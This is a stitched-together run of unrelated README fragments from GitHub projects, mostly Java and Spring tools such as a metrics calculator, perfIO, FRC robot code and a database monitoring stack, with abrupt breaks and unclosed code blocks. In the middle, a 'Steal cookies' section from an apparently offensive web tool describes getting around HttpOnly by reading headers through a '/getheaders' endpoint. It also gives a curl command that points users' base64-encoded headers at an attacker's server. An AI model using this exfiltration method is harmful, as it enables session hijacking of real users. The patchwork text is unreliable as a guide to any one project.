5. Support other vector databases ( Currently supports Qdrant, to be honest, it's good enough)
6. Support custom System Context and custom similar returned documents in DB (Default, for now, is 5.)

#### Rabbit hole
Don't try to retrieve an API key from older `.git` versions, it's a rabbit hole :)

Please create an Issue, if something is wrong I will look into it, and feel free to contribute to the project.

xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D ≤ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

Operaton is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Java EE 6 and is a perfect match for the Spring Framework. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

Visit our [Forum](https://forum.operaton.org)

## Components

Operaton provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Operaton Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Operations

- Operaton Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
- Operaton Cockpit - Web application tool for process operations.
- Operaton Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Operaton Tasklist - Web application for managing and completing user tasks in the context of processes.

### Highly Integrable

Out of the box, Operaton provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

## Process modelling

Operaton is fully backwards compatible to your existing BPMN-, DMN-models and Forms, which were created in Camunda Modeler for Camunda 7. You can download the Camunda Modeler [here](https://camunda.com/download/modeler/) (MIT Licence). 
Operaton removed the compatibility layer for Activiti. If you need to use Activiti models you will have to convert them (see the following [blog post](https://camunda.com/blog/2016/10/migrate-from-activiti-to-camunda/) for details).

### Steal cookies
Since the cool cookies have HttpOnly set, this works by first sending a request to the custom endpoint `/getheaders`, which returns all headers base64 encoded into the DOM. Those are then sent to the attacker. 

```sh
# Configure the server which will receive POST requests of users containing base64 encoded headers
curl ""http://yourserver/rest/maintenance/latest/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}""

Team254/FRC-2024-Public,main,"# FRC-2024-Public
Team 254's 2024 FRC robot code for [Vortex](https://www.team254.com/first/2024/). Vortex's code is written in Java and is based off of WPILib's Java control system.

The code is divided into several packages, each responsible for a different aspect of the robot function. This README explains setup instructions, the function of each package, and some of the variable naming conventions used. Additional information about each specific class can be found in that class' Java file.

## Setup Instructions

### General
1. Clone this repo
1. Run `./gradlew` to download gradle and needed FRC/Vendor libraries
1. Run `./gradlew tasks` to see available options
1. Enjoy!

### Visual Studio Code (Official IDE)
1. Get the WPILib extension for easiest use from the VSCode Marketplace - Requires Java 11 or greater
1. In [`.vscode/settings.json`](.vscode/settings.json), set the User Setting, `java.home`, to the correct directory pointing to your JDK 11 directory

### IntelliJ
1. Run `./gradlew idea`
1. Open the `FRC-2024-Public.ipr` file with IntelliJ

### Eclipse
1. Run `./gradlew eclipse`
1. Open Eclipse and go to File > Open Projects from File System...
1. Set the import source to the `FRC-2024-Public` folder then click finish

### Basic Gradle Commands
* Run `./gradlew deploy` to deploy to the robot in Terminal (*nix) or Powershell (Windows)
* Run `./gradlew build` to build the code.  Use the `--info` flag for more details
* Run `./gradlew test` to run all of the JUnit tests

### Simulation
* To simulate the robot run `./gradlew simulateJava`
* You will need to configure your keyboard settings for 1 Xbox Controller.
* To set up 3d visualization in AdvantageScope, import the Advantage_Scope.json.
  * If the JSON import does not work, you need to set up a 3D tab as follows:
    * 3D Poses: Robot (components) : NT: ""ComponentsPoseArray""
    * 3D Poses: Robot : NT: ""Drive/Viz/Pose3d""
    * 3D Poses: Note : NT: ""NoteVisualizer""

## Code Highlights
* Controller Modes

	The robot uses controller modes to modify the controller's controls based on the modal control. The following modes are used:
  - NOT_SPECIFIED - Allows for intaking and shooting against the subwoofer, used if any problem occurs during the match
  - SPEAKER - Ground intake and aims at speaker at all times, adjusting both the turret and hood based on location
  - HP - [Source intake](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L230) by raising the elevator, poops following the same logic as POOP mode
  - POOP - Ground intake, [poop pose generated](src/main/java/com/team254/lib/util/PoopTargetFactory.java) based on obstacles and location
	- [Line-Drive](src/main/java/com/team254/lib/util/PoopTargetFactory.java#L80) - when close to poop point without stage in the way
	- [Shallow vs Deep Amp Lob Pass](src/main/java/com/team254/frc2024/RobotContainer.java#L538) - changes location of lob pass based on controller input
  - [CLIMB](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L393) - raises climb arms, stages amp and elevator for trap, then climbs

* Branching Auto with Choreo

	In autonomous, the robot uses Choreo and [branching autos](src/main/java/com/team254/frc2024/commands/autocommands/BranchingAutoInterrupt.java) to customize each autonomous based on multiple selectors. At the midline, the robot decides between switching to another note if it did not pick up the current note, scoring the note and going to the next note, or initiating the last action. The following selectors are used before the match:
  - Starting Location - starting location of the robot, including Truss, Speaker, Source, SpeakerCorner, Amp
  - First Action - first action of the robot, including Three Close to Midline, One Close to Midline, Sprint to Midline, and Sprint to Midline No Preload
  - Priority Midline Sequence - sequence of midline notes to target in order, such as ABC, BAC, and EDC. A is the note closest to the Amp, and E is closest to the Source.
  - Last Action - last action of the robot, including Backoff, Score Preload, and Three Close
  - Blocked Notes - Midline notes that the robot should not branch off to - used if another robot in the alliance is targeting other notes


	Choreo is used to create all our paths (Open [.chor file](autopaths.chor) in Choreo), including midline note-to-note branching, scoring, and first and last actions. Paths to midline notes are interrupted when the intake banner sensor is triggered.

* AdvantageScope Simulation

	We used AdvantageScope to simulate subsystem movements and test new software, especially autonomous paths, without the need for the robot. We also visualized logs and live robot telemetry, including note projectile simulation. We imported the robot 3D model with a fully articulating Turret, Hood, Amplifier, and Climber, along with accurate moments of inertia and gear ratios to accurately visualize robot actions. 	 

	We also used AdvantageKit to log all important data to replay after each match. This included vision estimates, robot state values, and subsystem values. This helped to isolate issues after the match, including localization and other robot malfunctions.

* Auto-Aiming to Goal

	Our robot auto-aligns the hood and turret to goal in both Poop mode and Speaker mode. In [poop mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L117), we calculate the optimal hood and turret setpoints to reach the target poop pose, considering the constraints of the hood and the desired apex height. In [speaker mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L203), we determine the note launch speed based on the distance from target, and use motion and lift compensation to accurately represent the note’s trajectory when the robot is in motion. We wait until all subsystems are [on target](src/main/java/com/team254/frc2024/command_factories/AimFactory.java#L50) for goal before releasing, including the shooter RPS, the turret position, and hood position.

szeiger/perfio,master,"# perfIO - Fast and Convenient I/O for the JVM

## Overview

perfIO provides buffered streaming I/O abstractions for both binary and text data. The design is optimized for performance. The main perfIO classes correspond roughly to the following standard library abstractions:

| perfIO         | JDK (* and common 3rd-party additions)                                          |
|----------------|---------------------------------------------------------------------------------|
| BufferedInput  | BufferedInputStream, ByteArrayInputStream, DataInputStream, LimitedInputStream* |
| BufferedOutput | BufferedOutputStream, ByteArrayOutputStream, DataOutputStream                   |
| LineTokenizer  | BufferedReader + InputStreamReader                                              |
| TextOutput     | PrintWriter + BufferedWriter + OutputStreamWriter                               |

## How fast is it?

Reading and writing binary data using a sufficiently large buffer is faster than ByteBuffer, but with the full generality of streaming I/O that does not require a fixed buffer size. Data from the included benchmarks (measured on Temurin OpenJDK 22.0.2 on Linux x68-64) shows typical speed-ups between 3x and 40x in different scenarios compared to standard library abstractions for streaming I/O.

![2.svg](docs/2.svg)
![3.svg](docs/3.svg)
![4.svg](docs/4.svg)
![5.svg](docs/5.svg)
![6.svg](docs/6.svg)

## What makes it fast?

Mostly avoiding things that make the JDK abstractions slow:

- InputStream and OutputStream use the decorator pattern. You typically use multiple nested streams that have to make all of their reads/writes through a standard set of methods that operate on individual bytes or byte arrays. You can easily end up with polymorphic dispatch (because you are always calling methods of the same interface with different implementations) and double buffering.

  By contrast, BufferedInput and BufferedOutput are built around a single buffer (byte array, ByteBuffer or MemorySegment) with a position and limit. All reads and writes are made directly to the buffer. There is no method dispatch overhead no matter how deeply nested the objects are. Almost all reads and writes (except the ones that require re-buffering) are done with a single range check plus increment. Any additional checks are pushed out of the inner loop into the buffering.

- None of the perfIO classes are synchronized or use any locking or memory fences. Streaming I/O is inherently sequential. Multi-threaded use requires synchronization at a higher level anyway, so we do not need to incur any performance penalties from synchronizing in the core abstractions.

- The JDK's Reader and Writer interfaces, as well as the NIO CharsetEncoders and CharsetDecoders are based on char arrays. This was fine at the time they were added, but nowadays the JVM uses a byte-based compact representation for all Strings which are valid Latin-1. In practice, most Strings contain ASCII text, so any char-based design requires conversions back and forth between byte arrays and char arrays.

  perfIO's TextOutput converts directly from Strings to byte data (writing it directly into a BufferedOutput's byte array) and LineTokenizer does the same when reading. This makes use of the more efficient conversions for the common character sets (UTF-8, Latin-1, ASCII) that are built into the String class, Unfortunately the provided API is not sufficient to avoid double buffering in all cases. perfIO can optionally call internal JDK methods to make some common use cases even faster. 

perfIO also uses both FFM and NIO abstractions where appropriate (depending on performance for the specific use case) and the Vector incubator API (for LineTokenizer).

Another source of performance is not just making the available abstractions fast, but making fast abstractions easily available:

- Reading large files is much faster with memory mapping. While you can always do the mapping manually using the NIO and FFM APIs for more control, perfIO makes the common use case a one-liner.

- Binary formats often use length-prefixed blocks. perfIO provides length-limited views for reading them (at essentially zero cost), and advanced buffer management for writing a length prefix after the content without double buffering or manual buffer management.

## Usage

A top-level `BufferedInput` or `BufferedOutput` object is always instantiated by calling one of the static factory methods in the respective class. It should be closed after use by calling `close()`.

The methods for reading and writing multi-byte numeric values require a byte order. All factory methods set it to `BIG_ENDIAN` by default, but it can be changed at any time with the `order` method. This is consistent with `ByteBuffer` but different from the FFM API (which is mostly intended for interacting with native code and consequently uses the native byte order by default).

Since Java does not have unsigned integers, the main methods for reading and writing binary data are the signed ones. The only exception is `uint16` which uses `char`, the only unsigned primitive type. Other `uint` methods are convenience wrappers that use a larger signed type.

| Method  | Width                  | Java Type (or surrogate) |
|---------|------------------------|--------------------------|
| int8    | 8 bits signed          | byte                     |
| uint8   | 8 bits unsigned        | (int)                    |
| int16   | 16 bits signed         | short                    |
| uint16  | 16 bits unsigned       | char                     |
| int32   | 32 bits signed         | int                      |
| uint32  | 32 bits unsigned       | (long)                   |
| int64   | 64 bits signed         | long                     |
| float32 | 32 bits floating-point | float                    |
| float64 | 64 bits floating-point | double                   |

Both `BufferedInput` and `BufferedOutput` can have nested views, but the semantics are different. A `BufferedInput` is always read sequentially, thus creating a view at the current position (using the `delimitedView` method) locks the parent until the view is closed. The only method that may still be called while a view is active is `close()` which implicitly closes all active nested views.

A `BufferedOutput` can be written to out of order. This is important for writing binary formats with length prefixes. It is often inconvenient or inefficient to calculate the length without actually writing the data. If the prefix has a fixed size, you can use `reserve` to insert a nested `BufferedOutput` at the current position which can be filled at a later point. You must write exactly the requested amount of data to it before closing it:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  var b2 = b.reserve(4);
  val pos0 = b.totalBytesWritten();
  b.string(...);
  var len = (int)(b.totalBytesWritten() - pos0);
  b2.int32(len);
  b2.close();
```

When the length of the prefix is variable, you can use `defer` instead. This method creates a `BufferedOutput` which shares its buffer management with the parent but is only inserted into the parent once it is closed. Note that this reverses the roles of the two buffers compared to `reserve`:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  val b2 = b.defer();
  b2.string(...);
  b.int32((int)b2.totalBytesWritten());
  b2.close();
```

Both `BufferedInput` and `BufferedOutput` will reuse views by default. This means that you should not access any view after closing it (unless it was explicitly detached by calling `detach()`) because the object and/or its buffer may have been repurposed. This design makes the repeated use of views for writing small amounts of data very efficient.

A `LineTokenizer` can be obtained by calling `lines` on a `BufferedInput` object. It allows you to read a text file line by line. Line tokenization is currently limited to ASCII-compatible encodings, which includes UTF-8 and the ISO-8859 (""Latin"") charsets. `LineTokenizer` will use a faster SIMD-based implementation if the Vector API (incubator version as of JDK 22) is available.

A `TextOutput` can be obtained by calling `text` on a `BufferedOutput` object. It allows you to write text data, similar to `java.io.PrintWriter`. Unlike `LineTokenizer` it supports arbitrary character sets, but it is optimized for UTF-8, Latin-1 and ASCII.

  The chatbot initially selects the relevant agent based on the type of user query. Each agent (e.g., StockAnalyzer, RecordRetriever) is chosen according to its defined capabilities.

- **Level 2: Function Selection within Agent**  
  The chosen agent then identifies the specific function based on the user’s prompt. For example, if StockAnalyzer is activated, it will determine if the request is related to stock data, company details, or historical trends.

- **Level 3: Response Verification and Optimization**  
  The response generated by the agent is verified to ensure it aligns with the user’s query. If necessary, further optimizations are applied to refine the output.





### **Anti-scam Transaction Agent**

The **Anti-scam Transaction Agent** is a real-time monitoring tool designed to detect suspicious activities in uploaded transactions. It leverages **RabbitMQ** for message queuing, **WebSocket** for real-time alerts, and **Spring AI** for behavior analysis, providing efficient, real-time processing.

- **Implementation Logic**  
  This agent functions through an **event-driven** approach. When a client submits a transaction via a **POST request**, the system asynchronously sends the transaction data through **RabbitMQ** to the analysis agent. The agent reviews transaction history from the last 10 days as context, evaluating the current transaction using pre-configured behavioral models in **Spring AI**.

- **Suspicious Activity Detection**  
  If suspicious behavior is identified, the agent generates a **warning message** (prefixed with “WARNING”) and sends it instantly to the frontend via **WebSocket**. The frontend then decides how to manage these warnings, ensuring flexible handling.



### **Chatbot with RAG and Context Memory**

This **chatbot component** integrates **Spring AI** with the **Chroma Vector Database** to provide an advanced conversational experience, enhanced by **Retrieval-Augmented Generation (RAG)** and contextual memory.

- **File Vectorization and Storage**  
  Uploaded files are automatically vectorized and stored in the **vector database**, enabling efficient retrieval and knowledge augmentation during conversations.

- **RAG-Enhanced Responses**  
  When RAG is enabled in a client request, the chatbot utilizes the vectorized content to generate enriched, knowledge-based responses.

- **Context Memory Management**  
  The system employs **ChatMemory** and **MessageChatMemoryAdvisor** to maintain context, using unique **conversationIds** for each chat session. This ensures isolated context and chat memories for separate conversation threads.


### **Highly Customized Personal Finance Report**

This feature includes a standalone interface that retrieves up to the **20 most recent transactions** from the user’s database records. Through a **highly customized prompt manager**, these transactions are converted into a detailed prompt for the **LLM** (Large Language Model). The LLM then references stored documents in the **vector database** as context to generate a personalized, recent **financial status report** for the user.



### **AI-Driven Web Crawl**

This module allows users to **customize and retrieve specific web content** using the **Wiseflow Engine**. It provides full management, display, and synchronization of **investment themes** and **articles**.

- **Features**  
  Users can add, edit, or delete themes and articles. Each theme includes a **name** and **description**, while each article stores the **title**, **URL**, **summary**, and **content**. Data is fetched through a **database interface** and displayed at page initialization.

- **Soft Delete and Real-Time Sync**  
  Themes can be soft-deleted by marking their status as false, allowing for easy restoration. The module supports **real-time synchronization and search**, subscribing to data changes and automatically refreshing the page to display the latest themes and articles. Keyword filtering is also supported, enabling users to quickly find specific content.


### Other functionalities
1. Stock Price
- Real-time Stock Price driven by AlphaVantage API
2. Chat History
- Support user to view their chat history
3. File Persistence
- Support user to upload their financial data and files to the AWS S3

### Performance
- Use Redis to cache frequently accessed data
- Use async processing to improve performance

### Scalability
- Low coupling and high reusability code.

### Security
- Private files(e.g. bank statement) stored in AWS S3 are protected by ACL
- User authentication and authorization by using Spring Security 6(integrated with JWT)


### User Experience
- Responsive design by using Tailwind CSS
- event-driven architecture for smooth user experience by using WebSocket and RabbitMQ
- Intuitive UI/UX
- Google map API for location-based service
- Real-time Stock Price driven by AlphaVantage API

### Basic CRUD

sivaprasadreddy/spring-modular-monolith,main,"# spring-modular-monolith
An e-commerce application following Modular Monolith architecture using [Spring Modulith](https://spring.io/projects/spring-modulith).
The goal of this application is to demonstrate various features of Spring Modulith with a practical application.

![bookstore-modulith.png](bookstore-modulith.png)

This application follows modular monolith architecture with the following modules:

* **Common:** This module contains the code that is shared by all modules.
* **Catalog:** This module manages the catalog of products and store data in `catalog` schema.
* **Orders:** This module implements the order management and store the data in `orders` schema.
* **Inventory:** This module implements the inventory management and store the data in `inventory` schema.
* **Notifications:** This module handles the events published by other modules and sends notifications to the interested parties.
* **Webapp:** This module implements web UI using Thymeleaf, HTMX and Bootstrap. 

**Goals:**
* Implement each module as independently as possible.
* Prefer event-driven communication instead of direct module dependency wherever applicable.
* Store data managed by each module in an isolated manner by using different schema or database.
* Each module should be testable by loading only module-specific components.

**Module communication:**

* **Common** module is an OPEN module that can be used by other modules.
* **Orders** module invokes the **Catalog** module public API to validate the order details
* When an Order is successfully created, **Orders** module publishes **""OrderCreatedEvent""**
* The **""OrderCreatedEvent""** will also be published to external broker like RabbitMQ. Other applications may consume and process those events.
* **Inventory** module consumes ""OrderCreatedEvent"" and updates the stock level for the products.
* **Notifications** module consumes ""OrderCreatedEvent"" and sends an order confirmation email to the customer.

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK, Gradle using [SDKMAN](https://sdkman.io/)

```

Verify the prerequisites

```shell
$ java -version
$ docker info
$ docker compose version
$ task --version
```

## Using `task` to perform various tasks:

The default `Taskfile.yml` is configured to use Maven.
Another `Taskfile.gradle.yml` is also created with Gradle configuration.

If you want to use Gradle instead of Maven, then add `-t Taskfile.gradle.yml` for the `task` commands.

For example: 

```shell
$ task test` // uses Maven
$ task -t Taskfile.gradle.yml test` //uses Gradle
```

# Build The World's Largest Omnichain Data Network
Chainbase is a global blockchain data network with an extensive dataset and cluster worldwide. If we compare Chainbase’s global data network to a country, then Manuscript would be the language of this data network nation. Manuscript plays a crucial role in the Chainbase ecosystem, serving as a bridge connecting various data, services, and users.
### what is manuscript?
![manuscript](./images/manuscript_pipeline.png)
Manuscript is not just a language specification; it’s a protocol, framework, and toolkit designed to simplify and unify data access and processing methods. Through Manuscript, developers and users can more easily interact with the vast amount of data in the Chainbase network, whether querying, analyzing, or applying this data.
The vision of Manuscript is to realize “data trade” within the Chainbase network, establishing a Chainbase ecosystem component that allows users to access any data through any means, across any service, using any language. This grand vision can be broken down into the following key aspects:

- Any language: We hope users can use scripts in any mainstream programming language to customize data, including but not limited to: Golang, Rust, Python, Node.js, Java, C/C++, Zig, WebAssembly (WASM)
- Any method: Different users are familiar with different forms of data access, we hope users can access data through various means, including but not limited to: SQL, DataFrames, HTTPS, gRPC, FTP, WebDAV, FUSE
- Any data: Users should be able to access data in any format, such as: JSON, CSV, ORC, XML, XLSX, BLOB

```
#### 4. Access the GraphQL endpoint to query the data(GraphQL: http://127.0.0.1:8082)
![graphQL](./images/graphQL.jpg)

#### 5. Deploy the Manuscript to the Local Environment or the Chainbase Network(the network is coming soon...)
```bash
# 1. cat the manuscript_config.ini file
➜  ~ cat $HOME/.manuscript_config.ini
baseDir = /Users/azroa/github

[demo]
name = demo
···

# 2. vim the manuscript.yaml file
vim ~/github/manuscript/demo/manuscript.yaml

# 3. Deploy the Manuscript to the Local Environment
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=local
or
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=chainbase
```

### Key Concepts
There are two primary objects:
- `manuscript.yaml` - A script file used to describe the data processing workflow, defining data sources, data processing methods, and the final data flow direction.
- `docker-compose.yaml` - The Docker Compose file defines a local container cluster environment, allowing developers to test locally. After testing, it can be deployed to the Chainbase distributed network.

Under the hood, the `Manuscript` will:
- Start a default stream processing framework, such as a Flink cluster.
- Consume user-defined source data.
- Process these stream data using your defined transforms.
- Sink the processed data to the data source.

## Roadmap 📍

Here are some of the planned improvements:

- [x] Support Chainbase Network Streaming Lakehouse.
- [x] Support Flink application mode.
- [x] Support Schema Registry.
- [ ] Support for user-defined functions (UDFs) for blockchain data parsing, such as decoding contract events and functions
- [ ] Support custom advanced data processing logic with JAVA and Rust APIs.
- [ ] Support local lightweight k8s environment deployment.
- [ ] Support distributed edge node coordinators.
- [ ] Support RPC and substream data processing formats.
- [ ] Support light node authentication.

Anyel-ec/SecurityMonitoring,main,"# Open Source Tool for Monitoring MariaDB, PostgreSQL, and MongoDB Databases Using Prometheus and Grafana

This project aims to develop an open-source tool for dynamic monitoring of three databases: **MongoDB**, **PostgreSQL**, and **MariaDB/MySQL**. The tool allows users to specify connection credentials through a web interface in **React** and, subsequently, visualize custom dashboards in **Grafana** for one or several databases combined.

The backend is built with **Spring Boot** and uses **Prometheus** and **Grafana** to collect and visualize the selected database metrics.

## Project Status

This project is under development. So far, the following has been implemented:
- A **React** interface for entering database connection credentials.
- Integration of **Docker Compose** with services for Grafana, Prometheus, and exporters for **PostgreSQL**, **MongoDB**, and **MariaDB**.
- Initial monitoring and visualization configuration in **Grafana**.

## Technologies Used

- **Frontend**: React (created with Vite), React Bootstrap for designing dynamic forms.
- **Backend**: Spring Boot (under development).
- **Monitoring and Visualization**: Grafana and Prometheus.
- **Databases**: MongoDB, PostgreSQL, and MariaDB.
- **Containers**: Docker and Docker Compose for service orchestration.

## Features

1. **Database Connection Configuration**:
    - Users can specify credentials to connect to **MongoDB**, **PostgreSQL**, and **MariaDB** via a dynamic form in the React app.
    - Allows for combinations of different databases: for example, monitoring only **MongoDB**, **PostgreSQL**, or **MariaDB**, or combinations like **MongoDB+PostgreSQL**.

2. **Dynamic Monitoring**:
    - The **Spring Boot** backend receives the credentials provided by the user and configures the database connections.
    - Metrics are collected using **Prometheus** and visualized through **Grafana**.

3. **Visualization in Grafana**:
    - Preconfigured dashboards in **Grafana** that are activated based on the databases selected by the user.

## Docker Compose Configuration (`docker-compose.yml`)

The `docker-compose.yml` file is configured to start the necessary services for monitoring the databases and visualizing them in Grafana. Below is the current configuration:

```yaml
version: '3'

services:
  grafana:
    image: grafana/grafana
    ports:
      - ""${GRAFANA_PORT_EXTERNAL}:${GRAFANA_PORT_INTERNAL}""
    environment:
      GF_SECURITY_ADMIN_USER: ""${GRAFANA_USER}""
      GF_SECURITY_ADMIN_PASSWORD: ""${GRAFANA_PASSWORD}""
    volumes:
      - grafana_storage:/var/lib/grafana
    networks:
      - monitoring

  prometheus:
    image: prom/prometheus
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro 
    ports:
      - ""${PROMETHEUS_PORT_EXTERNAL}:${PROMETHEUS_PORT_INTERNAL}""
    networks:
      - monitoring

  postgres-exporter:
    image: quay.io/prometheuscommunity/postgres-exporter
    environment:
      DATA_SOURCE_NAME: ""postgresql://${POSTGRES_USER}:${POSTGRES_PASSWORD}@${POSTGRES_HOST}:${POSTGRES_PORT}?sslmode=disable""
    ports:
      - ""${EXPORT_POSTGRES_PORT_EXTERNAL}:${EXPORT_POSTGRES_PORT_INTERNAL}""
    networks:
      - monitoring

networks:
  monitoring:
    driver: bridge

volumes:
  grafana_storage:
```

This `docker-compose.yml` file configures and exposes the **Grafana**, **Prometheus**, and **Postgres Exporter** services. Ensure that the environment variables (`GRAFANA_USER`, `GRAFANA_PASSWORD`, `POSTGRES_USER`, `POSTGRES_PASSWORD`, etc.) are properly defined in your environment or `.env` file.

## Prometheus Configuration (`prometheus.yml`)

The `prometheus.yml` file is configured to monitor services for MongoDB, PostgreSQL, and MariaDB through their respective exporters.

```yaml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['prometheus:9090']

  - job_name: 'postgres'
    static_configs:
      - targets: ['postgres-exporter:9187']
```

## Installation and Usage

### 1. Clone the Repository

```bash
git clone https://github.com/Anyel-ec/SecurityMonitoring
cd SecurityMonitoring
```

### 2. Run the Services with Docker Compose

```bash
docker-compose up -d
```

This will launch the following services:
- **Grafana**: Accessible at `http://localhost:3000` (username: `admin`, password: `admin`).
- **Prometheus**: Accessible at `http://localhost:9090`.
- **PostgreSQL Exporter**: Accessible at `http://localhost:9187`.

### 3. Configure Grafana

1. Access **Grafana** at `http://localhost:3000`.
2. Log in using the credentials (`admin/admin`).
3. Add **Prometheus** as a data source:
   - URL: `http://prometheus:9090`.
4. Import the relevant dashboard to visualize the metrics for the configured databases.

### 4. Next Steps

The next step in development is to improve the integration with the databases, as well as automate the creation of dashboards in Grafana.

## Architecture
![Architecture](img/readme/img.png)

## Getting started

以下代码示例来自 [kbf-samples](https://github.com/kwai/kwai-business-extension-framwork/tree/main/kbf-samples).

```bash
git clone https://github.com/kwai/kwai-business-extension-framwork.git
cd kbf-samples/kbf-common-sample
```
运行`SampleApplication.java`,然后分别访问[http://127.0.0.1:8080/kbf?bizCode=trade2](http://127.0.0.1:8080/kbf?bizCode=trade1)和[http://127.0.0.1:8080/kbf?bizCode=trade1](http://127.0.0.1:8080/kbf?bizCode=trade1)，不同的业务身份将返回不同的结果


### Maven dependency

```xml
<dependency>
  <groupId>com.kuaishou</groupId>
  <artifactId>kbf-common-starter</artifactId>
  <version>{{last_version}}</version>
</dependency>

```

### 名词解释
| 名称    | 说明 |
| ---- | ------- |
| 业务 | 业务最终的目的是“售出产品，换取利润”，所以一个业务必定是有一个业务团队进行或处理商业上相关的活动，也是一个最小的经营单位    |
| 业务身份 | 系统唯一标识这个业务的标志就是业务身份     |
| 扩展点   | 相同流程，不同业务执行逻辑不同的节点，就叫扩展点   |


### 配置应用
在 application.properties 中添加以下配置：`spring.kbf.common.enabled=true`


### 定义扩展点
```java
@KExtPoint
public interface OrderPriceExtPoints extends ExtPoint {

  @KExtPointMethod
  Long calculateExpressFee(CreateOrderDTO createOrderDTO);

}
```
1. 定义扩展接口继承`ExtPoint`
2. 在接口添加`@KExtPoint`注解
3. 需要扩展的方法上添加`@KExtPointMethod`注解

### 定义服务执行扩展点

```java
@Service
public class CreateOrderServiceImpl implements CreateOrderService {

  @KExtPointInvoke
  private OrderPriceExtPoints orderPriceExtPoints;

  @Override
  @KSessionAround
  public CreateOrderResponse createOrder(CreateOrderRequest request) {
    CreateOrderDTO createOrder = request.getCreateOrder();
    Long expressFee = orderPriceExtPoints.calculateExpressFee(createOrder);
    CreateOrderResponse response = new CreateOrderResponse();
    response.setExpressFee(expressFee);
    return response;
  }
}
```
1. 定义扩展服务，需要将其定义为Spring Bean
2. 通过`@KExtPointInvoke`注解注入扩展点
3. 在执行扩展点的方法上添加`@KSessionAround`以开启`session`
4. 在方法内调用扩展点执行扩展方法

### 定义业务
```java
